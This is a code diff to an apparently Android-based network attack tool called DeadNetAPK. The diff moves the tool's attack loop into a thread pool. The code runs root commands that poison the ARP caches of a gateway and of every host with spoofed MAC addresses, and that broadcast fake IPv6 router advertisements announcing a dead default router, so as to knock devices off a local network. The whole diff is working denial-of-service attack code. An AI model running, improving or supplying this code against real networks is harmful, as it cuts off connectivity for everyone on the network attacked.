@@ -6,7 +6,12 @@ import logging
 import netifaces
 import ipaddress
 import subprocess
+import threading
 import platform as pt
+from kivy.clock import Clock
+
+from concurrent.futures import ThreadPoolExecutor
+
 
 from utils import *
 
@@ -46,6 +51,7 @@ class DeadNetAPK:
 
         self.print_mtd = print_mtd
         self.my_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
+        print(f"@@@@@ my_mac {self.my_mac}")
         self.loop_count = 0
 
         self.abort = str()
@@ -116,45 +122,56 @@ class DeadNetAPK:
     def user_abort(self):
         self.abort = self.user_abort_reason
 
-    def poison_arp(self):
+    def worker_attack_task(self, idx, host_ip):
+        if self.spoof_ipv6ra and idx % 5 == 0:  # todo into var not hardcoded?
+            self.do_ipv6_attack()
+        self.do_ipv4_attack(host_ip)
+
+    def do_ipv4_attack(self, host_ip):
         """
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
-        for idx, host_ip in enumerate(self.host_ipv4s):
-            if self.abort:
-                return
-            if self.spoof_ipv6ra:
-                if idx % 5 == 0:
-                    self.poison_ra()
-            subprocess.Popen(
-                f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
-                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.Popen(
-                f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
-                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.print_mtd(f"{self.intro}status - {GREEN}running...{COLOR_RESET} cycle #{self.loop_count} "
-                           f"{GRAY}[{idx + 1} / {len(self.host_ipv4s)}]{COLOR_RESET}")
+        subprocess.Popen(
+            f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(
+            f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    def poison_ra(self):
+
+    def do_ipv6_attack(self):
         """
-        * Broadcast a fake dead default router message
+        * broadcast a fake dead default router message
         """
         subprocess.Popen(f"su -c {self.nra_path} {self.gateway_mac} {self.gateway_ipv6} "
                          f"{self.ipv6_prefix} {self.ipv6_preflen} {self.network_interface}",
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+    def start_workers_attack_loop(self):
+        with ThreadPoolExecutor(max_workers=3) as executor:  # todo max workers? into var not hardcoded
+            for idx, ip in enumerate(self.host_ipv4s):
+                if self.abort:
+                    return
+                executor.submit(self.worker_attack_task, idx, ip)
+                # todo add print for ipv6 also
+                Clock.schedule_once(lambda dt: self.print_mtd(f"{self.intro}status - {GREEN}running...{COLOR_RESET} cycle #{self.loop_count} "
+                                                              f"{GRAY}[{idx + 1} / {len(self.host_ipv4s)}]{COLOR_RESET}"))
+
+                time.sleep(0.10)
+
     def start_attack(self):
         while not self.abort:
             try:
                 self.loop_count += 1
-                self.poison_arp()
+                self.start_workers_attack_loop()
+
             except Exception as exc:
                 self.abort = traceback.format_exc()
             except KeyboardInterrupt:
                 self.user_abort()
 
         if self.abort != self.user_abort_reason:
-            self.print_mtd(f"{self.abort}", True)
+            Clock.schedule_once(lambda dt: self.print_mtd(f"{self.abort}", True))
         else:
-            self.print_mtd(f"{self.intro}{self.abort}")
+            Clock.schedule_once(lambda dt: self.print_mtd(f"{self.intro}{self.abort}"))
